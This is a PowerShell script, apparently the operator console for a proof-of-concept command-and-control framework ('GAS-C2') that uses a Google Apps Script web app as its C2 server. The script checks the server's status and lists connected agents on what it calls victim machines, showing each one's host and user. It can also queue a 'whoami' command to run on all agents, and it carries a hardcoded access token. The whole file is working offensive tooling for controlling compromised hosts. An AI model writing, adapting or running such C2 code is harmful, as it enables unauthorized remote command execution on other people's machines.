#Requires -Version 5.1
# GAS-C2 -- quick check: is my C2 up and do I have agents?

param(
    [string]$C2Url = "",
    [string]$Token = "gas-c2-vrp-2026"
)

function Print  { param([string]$t, [string]$fg = "Gray") Write-Host $t -ForegroundColor $fg }
function Ok     { Print "  [+] $args" Green   }
function Fail   { Print "  [-] $args" Red     }
function Warn   { Print "  [!] $args" Yellow  }
function Head   { Print ""; Print "  -- $args" Cyan; Print "" }

Clear-Host
Print ""
Print "  GAS-C2-PoC  -  Live Check" Cyan
Print "  -------------------------" DarkGray
Print ""

# -- 1. Get URL ----------------------------------------------------------------
if (-not $C2Url) {
    Print "  Paste your GAS Web App URL:" White
    Print "  (https://script.google.com/macros/s/.../exec)" DarkGray
    $C2Url = (Read-Host "  >").Trim()
}

if ($C2Url -notmatch "^https://script\.google\.com") {
    Fail "That does not look like a GAS URL. Exiting."; exit 1
}

# -- 2. Status ----------------------------------------------------------------
Head "C2 Status"
try {
    $s = Invoke-RestMethod "$C2Url`?action=status&token=$Token" -TimeoutSec 10
    if ($s.status -eq "online") {
        Ok "C2 is ONLINE  (v$($s.version))"
        Ok "Agents registered : $($s.agents)"
        Ok "Commands queued   : $($s.commands)"
        Ok "Results stored    : $($s.results)"
    } else {
        Fail "Unexpected status: $($s | ConvertTo-Json -Compress)"
    }
} catch {
    Fail "Could not reach C2: $_"
    Warn "Check: deploy set to Anyone access? URL correct?"
    exit 1
}

# -- 3. Agents ----------------------------------------------------------------
Head "Connected Agents"
try {
    $r = Invoke-RestMethod "$C2Url`?action=agents&token=$Token" -TimeoutSec 10
    if ($r.count -eq 0) {
        Warn "No agents yet. Run agent.ps1 on a victim machine first."
    } else {
        Ok "$($r.count) agent(s) found:"
        Print ""
        foreach ($a in $r.agents) {
            $dot = if ($a.status -eq "active") { "*" } else { "o" }
            $col = if ($a.status -eq "active") { "Green" } else { "DarkGray" }
            $id8 = $a.agent_id.Substring(0, [Math]::Min(8, $a.agent_id.Length))
            Print "    $dot  $id8...  $($a.host)  $($a.user)  [$($a.status)]" $col
        }
    }
} catch {
    Fail "Could not fetch agents: $_"
}

# -- 4. Quick test command ----------------------------------------------------
Head "Quick Test"
Print "  Send a whoami to all agents? (Y/n)" White
$ans = (Read-Host "  >").Trim()
if ($ans -match "^[Yy]$" -or $ans -eq "") {
    $cmdId = [string][DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    try {
        $q = Invoke-RestMethod "$C2Url`?action=queue&token=$Token&cmd_id=$cmdId&target=*&command=whoami" -TimeoutSec 10
        if ($q.status -eq "queued") {
            Ok "Queued (id: $cmdId) -- check Results in your panel."
        } else {
            Fail "Queue failed: $($q | ConvertTo-Json -Compress)"
        }
    } catch {
        Fail "Could not queue command: $_"
    }
}

Print ""
Print "  Done." DarkGray
Print ""
